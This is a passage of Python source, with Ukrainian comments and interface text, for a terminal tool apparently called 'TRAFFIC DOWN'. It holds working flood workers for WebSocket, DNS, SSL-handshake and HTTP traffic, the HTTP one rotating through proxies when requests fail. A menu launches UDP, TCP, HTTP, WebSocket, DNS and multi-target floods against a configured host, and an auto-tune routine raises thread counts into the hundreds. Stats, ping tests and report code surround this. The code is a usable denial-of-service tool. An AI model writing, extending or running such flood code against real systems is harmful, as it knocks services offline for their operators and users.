                    except Exception as exc:
                        self._record_error(exc)
                        traffic_analyzer.record("HTTP FLOOD", 0, ok=False)
                        if proxy:
                            proxy_rotator.report_fail(proxy)
                        proxy = proxy_rotator.next()
                        await asyncio.sleep(0.5)
        except Exception as exc:
            self._record_error(exc)
        finally:
            self._dec_threads()

    # ── Worker: WebSocket Flood ───────────────────────────────────────────
    async def _ws_flood_task(self, url: str) -> None:
        self._inc_threads()
        msg_size   = cfg.data.get("ws_message_size", 256)
        ping_ivl   = cfg.data.get("ws_ping_interval", 5)
        verify_ssl = cfg.data.get("ssl_verify", False)
        try:
            connector = aiohttp.TCPConnector(ssl=None if verify_ssl else False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as sess:
                try:
                    async with sess.ws_connect(
                        url, heartbeat=float(ping_ivl),
                        timeout=aiohttp.ClientWSTimeout(ws_receive=30)
                    ) as ws:
                        while self.running and not self._stop_event.is_set():
                            payload = generate_payload(msg_size, "random")
                            try:
                                await ws.send_bytes(payload)
                                n = len(payload)
                                with self.lock:
                                    self.ul_total += n
                                traffic_analyzer.record("WS FLOOD", n, ok=True)
                                await asyncio.sleep(0.01)
                            except Exception as exc:
                                self._record_error(exc)
                                traffic_analyzer.record("WS FLOOD", 0, ok=False)
                                break
                except Exception as exc:
                    self._record_error(exc)
                    await asyncio.sleep(1)
        except Exception as exc:
            self._record_error(exc)
        finally:
            self._dec_threads()
            if self.running:
                await asyncio.sleep(0.5)
                asyncio.run_coroutine_threadsafe(self._ws_flood_task(url), self.loop)

    # ── Worker: DNS Flood ─────────────────────────────────────────────────
    def _dns_flood_task(self, ip: str, port: int) -> None:
        self._inc_threads()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        # Базовий DNS-запит для домену
        domain   = cfg.data.get("dns_domain", "example.com")
        parts    = domain.rstrip(".").split(".")
        question = b""
        for part in parts:
            enc = part.encode()
            question += bytes([len(enc)]) + enc
        question += b"\x00\x00\x01\x00\x01"   # A record, IN class

        try:
            while self.running and not self._stop_event.is_set():
                try:
                    # Рандомний ID транзакції
                    txid = random.randint(0, 65535).to_bytes(2, "big")
                    flags = b"\x01\x00"   # QR=0, opcode=query, RD=1
                    qdcount = b"\x00\x01"
                    zeros   = b"\x00\x00\x00\x00"
                    pkt = txid + flags + qdcount + zeros + question
                    sock.sendto(pkt, (ip, port))
                    n = len(pkt)
                    with self.lock:
                        self.ul_total += n
                    traffic_analyzer.record("DNS FLOOD", n, ok=True)
                    # Отримати відповідь (ігнорувати)
                    try:
                        sock.recv(512)
                        with self.lock:
                            self.dl_total += 512
                    except Exception:
                        pass
                except Exception as exc:
                    self._record_error(exc)
                    traffic_analyzer.record("DNS FLOOD", 0, ok=False)
                    time.sleep(0.01)
        except Exception as exc:
            self._record_error(exc)
        finally:
            sock.close()
            self._dec_threads()

    # ── Worker: SSL Stress Test ───────────────────────────────────────────
    def _ssl_stress_task(self, host: str, port: int) -> None:
        self._inc_threads()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        try:
            while self.running and not self._stop_event.is_set():
                try:
                    t0 = time.monotonic()
                    with socket.create_connection((host, port), timeout=5.0) as raw:
                        with ctx.wrap_socket(raw, server_hostname=host) as s:
                            rtt = (time.monotonic() - t0) * 1000.0
                            self.latency_percentile.add(rtt)
                            # Надіслати мінімальний HTTP-запит
                            req = (
                                f"HEAD / HTTP/1.1\r\nHost: {host}\r\n"
                                f"Connection: close\r\nUser-Agent: {APP_NAME}/{VERSION}\r\n\r\n"
                            ).encode()
                            s.sendall(req)
                            resp = s.recv(1024)
                            n_tx = len(req)
                            n_rx = len(resp)
                            with self.lock:
                                self.ul_total += n_tx
                                self.dl_total += n_rx
                            traffic_analyzer.record("SSL STRESS", n_rx + n_tx, ok=True)
                except Exception as exc:
                    self._record_error(exc)
                    traffic_analyzer.record("SSL STRESS", 0, ok=False)
                    time.sleep(0.1)
        except Exception as exc:
            self._record_error(exc)
        finally:
            self._dec_threads()

    # ── Worker: Ping Test ─────────────────────────────────────────────────
    def _ping_test_task(self, ip: str, port: int, count: int) -> None:
        self._inc_threads()
        for i in range(count):
            if not self.running or self._stop_event.is_set():
                break
            with self.lock:
                self.ping_sent += 1
            try:
                t0 = time.monotonic()
                with socket.create_connection((ip, port), timeout=2.0):
                    pass
                rtt = (time.monotonic() - t0) * 1000.0
                with self.lock:
                    self.ping_recv += 1
                    self.ping_results.append(rtt)
                self.latency_percentile.add(rtt)
            except Exception:
                pass
            time.sleep(0.1)
        self.running = False
        self._dec_threads()

    # ── Stats ─────────────────────────────────────────────────────────────
    def get_stats(self) -> Dict[str, Any]:
        with self.lock:
            dl   = self.dl_total
            ul   = self.ul_total
            err  = self.errors
            le   = self.last_error
            thr  = self._active_threads
            st   = self.start_time
            mxdl = self.max_dl_speed
            mxul = self.max_ul_speed
        with self._speed_lock:
            dl_now = self._dl_speed_now
            ul_now = self._ul_speed_now
        dur = (time.monotonic() - st) if st else 0.0
        pct = self.latency_percentile.get()
        sched_st = scheduler.get_status()
        return {
            "mode":           self.mode.value,
            "running":        self.running,
            "dl":             dl,
            "ul":             ul,
            "err":            err,
            "last_error":     le,
            "active_threads": thr,
            "duration":       dur,
            "dl_speed_now":   dl_now,
            "ul_speed_now":   ul_now,
            "max_dl":         mxdl,
            "max_ul":         mxul,
            "p50_ms":         pct.get("p50", 0),
            "p90_ms":         pct.get("p90", 0),
            "p99_ms":         pct.get("p99", 0),
            "scheduler":      sched_st,
            "traffic":        traffic_analyzer.get_summary(),
            "proxy_stats":    proxy_rotator.get_stats(),
        }

    def get_ping_test_report(self) -> Dict[str, Any]:
        with self.lock:
            sent  = self.ping_sent
            recv  = self.ping_recv
            rtts  = list(self.ping_results)
        loss_pct = ((sent - recv) / sent * 100) if sent > 0 else 0.0
        pct = self.latency_percentile.get()
        if not rtts:
            return {"sent": sent, "recv": recv, "loss_pct": loss_pct}
        return {
            "sent":     sent,
            "recv":     recv,
            "loss_pct": round(loss_pct, 2),
            "avg_ms":   round(sum(rtts) / len(rtts), 2),
            "min_ms":   round(min(rtts), 2),
            "max_ms":   round(max(rtts), 2),
            "jitter_ms":round(
                sum(abs(rtts[i]-rtts[i-1]) for i in range(1,len(rtts)))/(len(rtts)-1), 2
            ) if len(rtts) > 1 else 0.0,
            "p50_ms":   pct.get("p50", 0),
            "p90_ms":   pct.get("p90", 0),
            "p99_ms":   pct.get("p99", 0),
        }

    def auto_tune_threads(self) -> Dict[str, int]:
        """
        Автоматично підбирає кількість потоків на основі CPU та пропускної здатності.
        """
        cpus     = psutil.cpu_count(logical=True) or 2
        mem_gb   = psutil.virtual_memory().total / 1024**3
        net_mbs  = 100.0   # мінімальне припущення

        # Пробуємо виміряти реальну пропускну здатність за 2 секунди
        t0_dl = self.dl_total
        t0_ul = self.ul_total
        time.sleep(2.0)
        dl_diff = (self.dl_total - t0_dl) / 2.0 / 1024**2
        ul_diff = (self.ul_total - t0_ul) / 2.0 / 1024**2
        if dl_diff > 0 or ul_diff > 0:
            net_mbs = max(dl_diff, ul_diff) * 1.5

        # Формула підбору
        th_dl   = max(5, min(200,  int(cpus * 4)))
        th_ul   = max(10, min(1000, int(cpus * 20)))
        th_tcp  = max(5, min(500,  int(cpus * 10)))
        th_http = max(5, min(500,  int(cpus * 8)))
        th_ws   = max(5, min(300,  int(cpus * 5)))
        th_dns  = max(20, min(1000, int(cpus * 30)))
        th_ssl  = max(5, min(200,  int(cpus * 4)))

        result = {
            "threads_dl":   th_dl,
            "threads_ul":   th_ul,
            "threads_tcp":  th_tcp,
            "threads_http": th_http,
            "threads_ws":   th_ws,
            "threads_dns":  th_dns,
            "threads_ssl":  th_ssl,
        }
        cfg.data.update(result)
        cfg.save()
        log.info(f"Auto-Tune v2: {result}")
        return result

    def generate_and_save_report(self, note: str = "") -> Dict[str, Any]:
        with self.lock:
            dl_total = self.dl_total
            ul_total = self.ul_total
            errors   = self.errors
            duration = (time.monotonic() - self.start_time) if self.start_time else 0.0
            mode_val = self.mode.value
            max_dl   = self.max_dl_speed
            max_ul   = self.max_ul_speed
            dl_hist  = list(self.dl_speeds_history)
            ul_hist  = list(self.ul_speeds_history)
            p_sent   = self.ping_sent
            p_recv   = self.ping_recv
            p_rtts   = list(self.ping_results)

        avg_dl = (sum(dl_hist) / len(dl_hist)) if dl_hist else 0.0
        avg_ul = (sum(ul_hist) / len(ul_hist)) if ul_hist else 0.0
        ping_stats = ping_monitor.get_stats()
        pct        = self.latency_percentile.get()

        report: Dict[str, Any] = {
            "session_end_time":   datetime.now().isoformat(),
            "app_version":        VERSION,
            "mode":               mode_val,
            "duration_seconds":   round(duration, 2),
            "total_download_gb":  round(dl_total / 1024**3, 5),
            "total_upload_gb":    round(ul_total / 1024**3, 5),
            "avg_download_mbs":   round(avg_dl, 3),
            "max_download_mbs":   round(max_dl, 3),
            "avg_upload_mbs":     round(avg_ul, 3),
            "max_upload_mbs":     round(max_ul, 3),
            "errors_count":       errors,
            "ping_avg_ms":        round(ping_stats["avg"], 2) if ping_stats.get("avg") else None,
            "ping_jitter_ms":     round(ping_stats["jitter"], 2),
            "ping_loss_pct":      round(ping_stats["loss_pct"], 2),
            "ping_p50_ms":        ping_stats.get("p50"),
            "ping_p90_ms":        ping_stats.get("p90"),
            "ping_p99_ms":        ping_stats.get("p99"),
            "latency_p50_ms":     pct.get("p50", 0),
            "latency_p90_ms":     pct.get("p90", 0),
            "latency_p99_ms":     pct.get("p99", 0),
            "ping_test_sent":     p_sent,
            "ping_test_recv":     p_recv,
            "traffic_summary":    traffic_analyzer.get_summary(),
            "note":               note,
            "system":             get_system_info(),
            "config_snapshot": {
                "threads_dl":    cfg.data["threads_dl"],
                "threads_ul":    cfg.data["threads_ul"],
                "threads_tcp":   cfg.data["threads_tcp"],
                "threads_http":  cfg.data["threads_http"],
                "threads_ws":    cfg.data["threads_ws"],
                "threads_dns":   cfg.data["threads_dns"],
                "threads_ssl":   cfg.data["threads_ssl"],
                "target":        f"{cfg.data['target_ip']}:{cfg.data['target_port']}",
                "bandwidth_limit_dl": cfg.data.get("bandwidth_limit_dl", 0),
                "bandwidth_limit_ul": cfg.data.get("bandwidth_limit_ul", 0),
                "http_method":   cfg.data.get("http_method", "GET"),
                "proxy":         cfg.data.get("proxy_url", ""),
                "proxy_count":   len(cfg.data.get("proxy_list", [])),
            },
        }

        log.info(
            "\n    ─── ЗВІТ ПРО СЕСІЮ ─────────────────────────────\n"
            f"    Режим      : {report['mode']}\n"
            f"    Тривалість : {report['duration_seconds']:.2f} сек.\n"
            f"    DL Total   : {report['total_download_gb']:.4f} GB\n"
            f"    UL Total   : {report['total_upload_gb']:.4f} GB\n"
            f"    DL Avg/Max : {report['avg_download_mbs']:.2f} / {report['max_download_mbs']:.2f} MB/s\n"
            f"    UL Avg/Max : {report['avg_upload_mbs']:.2f} / {report['max_upload_mbs']:.2f} MB/s\n"
            f"    Latency    : P50={pct.get('p50',0)}мс  P90={pct.get('p90',0)}мс  P99={pct.get('p99',0)}мс\n"
            f"    Пінг avg   : {report['ping_avg_ms']} мс  jitter: {report['ping_jitter_ms']} мс\n"
            f"    Помилок    : {report['errors_count']}\n"
            f"    Нотатка    : {note or '—'}\n"
            "    ─────────────────────────────────────────────────"
        )

        ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        fpath = REPORT_DIR / f"report_{ts}.json"
        try:
            fpath.write_text(
                json.dumps(report, indent=4, ensure_ascii=False), encoding="utf-8"
            )
            log.info(f"Звіт збережено: {fpath}")
        except IOError as exc:
            log.error(f"Не вдалося зберегти звіт: {exc}")

        session_history.add(report)
        return report


engine = NetworkEngine()


# ─────────────────────────────────────────────────────────────────────────────
# 5. КОНСОЛЬНИЙ ІНТЕРФЕЙС (TUI) — Rich
# ─────────────────────────────────────────────────────────────────────────────
TUI_BANNER = r"""
 ████████╗██████╗  █████╗ ███████╗███████╗██╗ ██████╗
    ██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝
    ██║   ██████╔╝███████║█████╗  █████╗  ██║██║
    ██║   ██╔══██╗██╔══██║██╔══╝  ██╔══╝  ██║██║
    ██║   ██║  ██║██║  ██║██║     ██║     ██║╚██████╗
    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝ ╚═════╝
         ██████╗  ██████╗ ██╗    ██╗███╗   ██╗
         ██╔══██╗██╔═══██╗██║    ██║████╗  ██║
         ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
         ██║  ██║██║   ██║██║███╗██║██║╚██╗██║
         ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
         ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"""


class Sparkline:
    """ASCII sparkline для Rich."""
    _BARS = " ▂▃▄▅▆▇█"

    def __init__(self, data: List[float], color: str = "green", width: int = 30):
        self.data  = data[-width:]
        self.color = color

    def __rich__(self) -> Text:
        if not self.data:
            return Text(" " * 30, style=self.color)
        max_val = max(self.data) or 1.0
        text    = Text(style=self.color)
        for val in self.data:
            idx = int((val / max_val) * (len(self._BARS) - 1))
            text.append(self._BARS[max(0, min(idx, len(self._BARS)-1))])
        return text


class TermuxUI:
    """
    Консольний TUI для Linux та Termux (також доступний на Windows з --no-gui).
    Використовує Rich Live для оновлення екрану.
    6 екранів: dashboard / settings / history / diagnostics / plugins / stats
    """

    _SCREENS = ["dashboard", "settings", "history", "diagnostics", "plugins", "stats"]

    def __init__(self) -> None:
        self.console        = Console()
        self.current_screen = "dashboard"
        self.last_dl        = 0
        self.last_ul        = 0
        self.last_t         = time.monotonic()
        self.dl_spark       = [0.0] * 50
        self.ul_spark       = [0.0] * 50
        self._splash_shown  = False
        self._log_lines:    Deque[str] = deque(maxlen=30)
        self._geoip:        Optional[GeoIPResult] = None
        self._geoip_loading = False

    # ── Splash ────────────────────────────────────────────────────────────
    def _show_splash(self) -> None:
        self.console.clear()
        self.console.print(f"[bold cyan]{TUI_BANNER}[/]")
        self.console.print(
            f"[bold white]    Version {VERSION}  ·  {PLATFORM_STR}  ·  Build {BUILD_DATE}[/]\n"
        )
        sysinfo = get_system_info()
        self.console.print(
            f"[dim]    CPU: {sysinfo.get('cpu_count',0)} cores ({sysinfo.get('cpu_phys',0)} фіз.)"
            f"  RAM: {sysinfo.get('ram_total_gb',0):.1f} GB"
            f"  IP: {sysinfo.get('local_ip','?')}"
            f"  GW: {sysinfo.get('gateway_ip','?')}[/]\n"
        )
        self.console.print(
            "[dim]    Нові режими v9.0: WebSocket Flood · DNS Flood · SSL Stress · Multi-Target[/]\n"
        )
        time.sleep(2.0)

    # ── Screen renderers ──────────────────────────────────────────────────
    def _render_dashboard(self) -> Panel:
        stats    = engine.get_stats()
        dl_speed = stats["dl_speed_now"]
        ul_speed = stats["ul_speed_now"]

        if engine.running:
            self.dl_spark.append(dl_speed / 1024**2)
            self.dl_spark.pop(0)
            self.ul_spark.append(ul_speed / 1024**2)
            self.ul_spark.pop(0)

        ping     = ping_monitor.get_stats()
        mode_color = {
            "DOWNLOADING":  "bold green",
            "UDP FLOOD":    "bold red",
            "TCP FLOOD":    "bold magenta",
            "HTTP FLOOD":   "bold yellow",
            "PING TEST":    "bold cyan",
            "WS FLOOD":     "bold blue",
            "DNS FLOOD":    "bold orange1",
            "SSL STRESS":   "bold violet",
            "MULTI TARGET": "bold bright_red",
            "IDLE":         "dim white",
        }.get(stats["mode"], "white")

        tbl = Table(show_header=False, box=None, padding=(0, 2))
        tbl.add_column("k", style="dim cyan", width=22)
        tbl.add_column("v", style="bold white")

        dur_str = format_duration(stats["duration"]) if stats["duration"] > 0 else "--:--:--"
        sched   = stats.get("scheduler", {})
        tbl.add_row("Режим",     f"[{mode_color}]{stats['mode']}[/]")
        tbl.add_row("Статус",    "[bold green]● АКТИВНИЙ[/]" if engine.running else "[dim]○ СТОП[/]")
        tbl.add_row("Потоки",    str(stats["active_threads"]))
        tbl.add_row("Тривалість",dur_str)
        tbl.add_row("Помилки",   f"[red]{stats['err']}[/]")
        tbl.add_row("Планувальник", sched.get("phase","—"))
        if stats["last_error"] != "—":
            tbl.add_row("Ост. помилка", f"[dim red]{stats['last_error'][:46]}[/]")

        spd = Table(show_header=True, box=None, padding=(0, 2))
        spd.add_column("",      style="dim cyan",   width=14)
        spd.add_column("Зараз", style="bold green", width=14, justify="right")
        spd.add_column("Max",   style="yellow",     width=14, justify="right")
        spd.add_column("Total", style="white",      width=12, justify="right")
        spd.add_row(
            "⬇ Download",
            format_speed(dl_speed),
            f"{stats['max_dl']:.2f} MB/s",
            format_bytes(stats["dl"]),
        )
        spd.add_row(
            "⬆ Upload",
            format_speed(ul_speed),
            f"{stats['max_ul']:.2f} MB/s",
            format_bytes(stats["ul"]),
        )

        spark_panel = Panel(
            Columns([
                Text("DL ", style="bold green") + Sparkline(self.dl_spark, "green").__rich__(),
                Text("UL ", style="bold red")   + Sparkline(self.ul_spark, "red").__rich__(),
            ]),
            title="[dim]Графік швидкості[/]", border_style="dim blue",
        )

        if ping["last"] is not None:
            ping_str = (
                f"RTT:[bold cyan]{ping['last']:.1f}[/]мс "
                f"avg[cyan]{ping['avg']:.1f}[/] "
                f"P90:[yellow]{ping.get('p90',0):.1f}[/] "
                f"P99:[red]{ping.get('p99',0):.1f}[/] "
                f"jitter:[yellow]{ping['jitter']:.1f}[/] "
                f"loss:[{'red' if ping['loss_pct']>5 else 'green'}]{ping['loss_pct']:.1f}%[/]"
            )
        else:
            ping_str = "[dim]Пінг: —[/]"

        # Latency percentiles
        lat_str = (
            f"Latency → P50:[cyan]{stats.get('p50_ms',0):.1f}[/]мс  "
            f"P90:[yellow]{stats.get('p90_ms',0):.1f}[/]мс  "
            f"P99:[red]{stats.get('p99_ms',0):.1f}[/]мс"
        ) if stats.get("p50_ms") else ""

        try:
            cpu = psutil.cpu_percent(interval=None)
            mem = psutil.virtual_memory()
            net = psutil.net_io_counters()
            sys_str = (
                f"CPU [{'red' if cpu>80 else 'yellow' if cpu>50 else 'green'}]{cpu:.1f}%[/]  "
                f"RAM [{'red' if mem.percent>85 else 'yellow'}]{mem.percent:.1f}%[/]  "
                f"[dim]↓{format_bytes(net.bytes_recv)} ↑{format_bytes(net.bytes_sent)}[/]"
            )
        except Exception:
            sys_str = ""

        auto_stop = cfg.data.get("auto_stop_seconds", 0)
        dur       = stats["duration"]
        timer_str = ""
        if engine.running and auto_stop > 0:
            pct   = min(1.0, dur / auto_stop)
            bar_w = 40
            filled = int(bar_w * pct)
            bar  = f"[green]{'█' * filled}[/][dim]{'░' * (bar_w - filled)}[/]"
            remain = max(0, auto_stop - dur)
            timer_str = f"Автозупинка: {bar} {remain:.0f}с"

        from rich.console import Group as RGroup
        from rich.table   import Table as RTable
        lt = RTable(show_header=False, box=None, padding=0)
        lt.add_column(width=42)
        lt.add_column(width=58)
        lt.add_row(tbl, spd)

        content = Panel(
            RGroup(
                lt,
                Rule(style="dim blue"),
                spark_panel,
                Text.from_markup(ping_str),
                Text.from_markup(lat_str) if lat_str else Text(""),
                Text.from_markup(sys_str),
                Text.from_markup(timer_str) if timer_str else Text(""),
            ),
            title=f"[bold cyan] {APP_NAME} {VERSION} [/] [dim]DASHBOARD[/]",
            border_style="cyan",
        )
        return content

    def _render_history(self) -> Panel:
        entries = session_history.entries[:12]
        tbl = Table(
            "Час", "Режим", "Тривал.", "DL avg", "UL avg", "Total DL", "P99мс", "Err",
            show_header=True, box=None, padding=(0, 1),
        )
        for e in entries:
            mode  = e.get("mode", "—")
            color = "green" if mode == "DOWNLOADING" else (
                "yellow" if mode in ("HTTP FLOOD","WS FLOOD") else "red"
            )
            tbl.add_row(
                e.get("session_end_time", "—")[:19],
                f"[{color}]{mode}[/]",
                f"{e.get('duration_seconds', 0):.0f}s",
                f"{e.get('avg_download_mbs', 0):.2f} MB/s",
                f"{e.get('avg_upload_mbs', 0):.2f} MB/s",
                f"{e.get('total_download_gb', 0):.4f} GB",
                str(e.get("ping_p99_ms", "—")),
                str(e.get("errors_count", 0)),
            )
        if not entries:
            return Panel("[dim]Немає записів[/]", title="[bold]Історія[/]", border_style="blue")
        return Panel(tbl, title="[bold]Останні сесії[/]", border_style="blue")

    def _render_settings_preview(self) -> Panel:
        tbl = Table(show_header=False, box=None, padding=(0, 2))
        tbl.add_column("Параметр", style="dim cyan", width=26)
        tbl.add_column("Значення", style="bold white")
        rows = [
            ("IP Цілі",          cfg.data["target_ip"]),
            ("Порт",             str(cfg.data["target_port"])),
            ("Потоків DL",       str(cfg.data["threads_dl"])),
            ("Потоків UDP",      str(cfg.data["threads_ul"])),
            ("Потоків TCP",      str(cfg.data["threads_tcp"])),
            ("Потоків HTTP",     str(cfg.data["threads_http"])),
            ("Потоків WS",       str(cfg.data["threads_ws"])),
            ("Потоків DNS",      str(cfg.data["threads_dns"])),
            ("Потоків SSL",      str(cfg.data["threads_ssl"])),
            ("Розмір пакету",   f"{cfg.data['packet_size']} Б"),
            ("Ліміт DL MB/s",   str(cfg.data.get("bandwidth_limit_dl", 0))),
            ("HTTP Метод",       cfg.data.get("http_method", "GET")),
            ("HTTP URL",         cfg.data.get("http_target_url", "")[:46]),
            ("WS URL",           cfg.data.get("ws_target_url", "")[:46]),
            ("DNS Target",       cfg.data.get("dns_target_ip", "")),
            ("DNS Domain",       cfg.data.get("dns_domain", "")),
            ("Proxy",            cfg.data.get("proxy_url", "") or "немає"),
            ("Proxy List",       str(len(cfg.data.get("proxy_list", []))) + " шт."),
            ("Автозупинка",     f"{cfg.data.get('auto_stop_seconds', 0)}с (0=вимкнено)"),
            ("Ramp-Up",         f"{cfg.data.get('scheduler_ramp_sec', 0)}с"),
            ("SSL Верифікація", "Так" if cfg.data.get("ssl_verify") else "Ні"),
            ("IPv6",            "Так" if cfg.data.get("use_ipv6") else "Ні"),
            ("Payload",          cfg.data.get("payload_template", "random")),
            ("Webhook",          cfg.data.get("webhook_url", "")[:40] or "немає"),
        ]
        for k, v in rows:
            tbl.add_row(k, v)
        return Panel(tbl, title="[bold]Поточні налаштування[/]", border_style="yellow")

    def _render_diagnostics(self) -> Panel:
        sysinfo = get_system_info()
        tbl = Table(show_header=False, box=None, padding=(0, 2))
        tbl.add_column("", style="dim cyan", width=22)
        tbl.add_column("", style="bold white")
        for k, v in sysinfo.items():
            tbl.add_row(k, str(v))
        geo_str = str(self._geoip) if self._geoip else (
            "[dim]Завантаження...[/]" if self._geoip_loading else "[dim]Не завантажено[/]"
        )
        tbl.add_row("GeoIP цілі", geo_str)
        ds = detect_dual_stack(cfg.data.get("target_ip", "8.8.8.8"))
        tbl.add_row("IPv4 available", "✓" if ds["ipv4"] else "✗")
        tbl.add_row("IPv6 available", "✓" if ds["ipv6"] else "✗")
        return Panel(tbl, title="[bold]Діагностика системи[/]", border_style="magenta")

    def _render_plugins(self) -> Panel:
        discovered = plugin_manager.discover()
        loaded     = plugin_manager.list_loaded()
        tbl = Table("Назва", "Статус", show_header=True, box=None, padding=(0, 2))
        for name in discovered:
            status = "[bold green]Завантажено[/]" if name in loaded else "[dim]Не завантажено[/]"
            tbl.add_row(name, status)
        if not discovered:
            return Panel(
                f"[dim]Немає плагінів у {PLUGINS_DIR}/[/]",
                title="[bold]Плагіни[/]", border_style="bright_black"
            )
        return Panel(tbl, title="[bold]Плагіни[/]", border_style="bright_blue")

    def _render_live_stats(self) -> Panel:
        """Детальна live-статистика по режимах."""
        tbl = Table(show_header=True, box=None, padding=(0, 2))
        tbl.add_column("Режим", style="dim cyan", width=16)
        tbl.add_column("Пакети", style="white", width=12, justify="right")
        tbl.add_column("Байти", style="green", width=14, justify="right")
        tbl.add_column("Помилки", style="red", width=10, justify="right")
        tbl.add_column("MB/s (5с)", style="yellow", width=12, justify="right")
        summary    = traffic_analyzer.get_summary()
        throughput = traffic_analyzer.throughput_by_mode(5.0)
        for mode, s in summary.items():
            tp = throughput.get(mode, 0) / 1024**2
            tbl.add_row(
                mode,
                str(s["pkts"]),
                format_bytes(s["bytes"]),
                str(s["errors"]),
                f"{tp:.2f}",
            )
        if not summary:
            return Panel("[dim]Немає даних[/]", title="[bold]Live Stats[/]", border_style="green")
        return Panel(tbl, title="[bold]Live Traffic Stats[/]", border_style="green")

    # ── Main menu ─────────────────────────────────────────────────────────
    def _print_menu(self) -> None:
        mode_colors = {
            "IDLE":         "dim",
            "DOWNLOADING":  "green",
            "UDP FLOOD":    "red",
            "TCP FLOOD":    "magenta",
            "HTTP FLOOD":   "yellow",
            "PING TEST":    "cyan",
            "WS FLOOD":     "blue",
            "DNS FLOOD":    "orange1",
            "SSL STRESS":   "violet",
            "MULTI TARGET": "bright_red",
        }
        mc = mode_colors.get(engine.mode.value, "white")
        running_str = (
            f"[{mc}]{engine.mode.value}[/]" +
            (" [bold green]●[/]" if engine.running else " [dim]○[/]")
        )
        self.console.print(
            f"\n  [{running_str}]  "
            f"[dim]Target: {cfg.data['target_ip']}:{cfg.data['target_port']}[/]"
        )
        self.console.print(Rule(style="dim"))
        self.console.print(
            "  [bold cyan][1][/] Dashboard  "
            "[bold cyan][2][/] Налаштування  "
            "[bold cyan][3][/] Історія  "
            "[bold cyan][4][/] Діагностика  "
            "[bold cyan][5][/] Плагіни  "
            "[bold cyan][6][/] Live Stats\n"

            "  [bold green][d][/] Download  "
            "[bold red][u][/] UDP Flood  "
            "[bold magenta][t][/] TCP Flood  "
            "[bold yellow][h][/] HTTP Flood  "
            "[bold cyan][p][/] Ping Test\n"

            "  [bold blue][w][/] WS Flood  "
            "[bold orange1][n][/] DNS Flood  "
            "[bold violet][l][/] SSL Stress  "
            "[bold bright_red][m][/] Multi-Target\n"

            "  [bold white][s][/] Стоп  "
            "[bold white][r][/] Пресети  "
            "[bold white][e][/] Експорт  "
            "[bold white][a][/] Авто-тюнінг  "
            "[bold white][g][/] Plugins  "
            "[bold white][q][/] Вихід"
        )
        self.console.print(Rule(style="dim"))

    def _handle_input(self, choice: str) -> bool:
        choice = choice.strip().lower()

        if choice == "q":
            return False

        elif choice == "1":
            self.current_screen = "dashboard"

        elif choice == "2":
            self.current_screen = "settings"
            self._settings_menu()

        elif choice == "3":
            self.current_screen = "history"

        elif choice == "4":
            self.current_screen = "diagnostics"
            if not self._geoip and not self._geoip_loading:
                self._geoip_loading = True
                threading.Thread(
                    target=self._load_geoip, daemon=True
                ).start()

        elif choice == "5":
            self.current_screen = "plugins"
            self._plugins_menu()

        elif choice == "6":
            self.current_screen = "stats"

        elif choice == "d":
            if not engine.running:
                engine.start_download()
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "u":
            if not engine.running:
                ip   = cfg.data.get("target_ip", "192.168.0.1")
                port = cfg.data.get("target_port", 80)
                engine.start_flood(ip, port, EngineMode.UDP_FLOOD)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "t":
            if not engine.running:
                ip   = cfg.data.get("target_ip", "192.168.0.1")
                port = cfg.data.get("target_port", 80)
                engine.start_flood(ip, port, EngineMode.TCP_FLOOD)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "h":
            if not engine.running:
                url = cfg.data.get("http_target_url", "http://192.168.0.1/")
                engine.start_http_flood(url)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "w":
            if not engine.running:
                url = cfg.data.get("ws_target_url", "ws://192.168.0.1/")
                engine.start_ws_flood(url)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "n":
            if not engine.running:
                ip   = cfg.data.get("dns_target_ip", "8.8.8.8")
                port = cfg.data.get("dns_target_port", 53)
                engine.start_dns_flood(ip, port)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "l":
            if not engine.running:
                host = cfg.data.get("ssl_target_host", "192.168.0.1")
                port = cfg.data.get("ssl_target_port", 443)
                engine.start_ssl_stress(host, port)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "m":
            if not engine.running:
                self._multi_target_menu()
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "p":
            if not engine.running:
                ip   = cfg.data.get("target_ip", "192.168.0.1")
                port = cfg.data.get("target_port", 80)
                engine.start_ping_test(ip, port, count=100)
                self.current_screen = "dashboard"
            else:
                self.console.print("[yellow]Рушій вже активний.[/]")

        elif choice == "s":
            if engine.running:
                note = Prompt.ask("[dim]Нотатка (Enter — пропустити)[/]", default="")
                engine.stop(note=note)
            else:
                self.console.print("[dim]Рушій не активний.[/]")

        elif choice == "r":
            self._presets_menu()

        elif choice == "e":
            self._export_menu()

        elif choice == "a":
            self.console.print("[cyan]Авто-тюнінг... [/]")
            res = engine.auto_tune_threads()
            self.console.print(f"[green]Результат: {res}[/]")

        elif choice == "g":
            self.current_screen = "plugins"
            self._plugins_menu()

        return True

    def _settings_menu(self) -> None:
        self.console.clear()
        self.console.print(Panel("[bold]Налаштування v9.0[/]", border_style="yellow"))
        fields = [
            ("IP Цілі",           "target_ip",          str),
            ("Порт",              "target_port",         int),
            ("Потоків DL",        "threads_dl",          int),
            ("Потоків UDP",       "threads_ul",          int),
            ("Потоків TCP",       "threads_tcp",         int),
            ("Потоків HTTP",      "threads_http",        int),
            ("Потоків WS",        "threads_ws",          int),
            ("Потоків DNS",       "threads_dns",         int),
            ("Потоків SSL",       "threads_ssl",         int),
            ("Розмір пакету (Б)", "packet_size",         int),
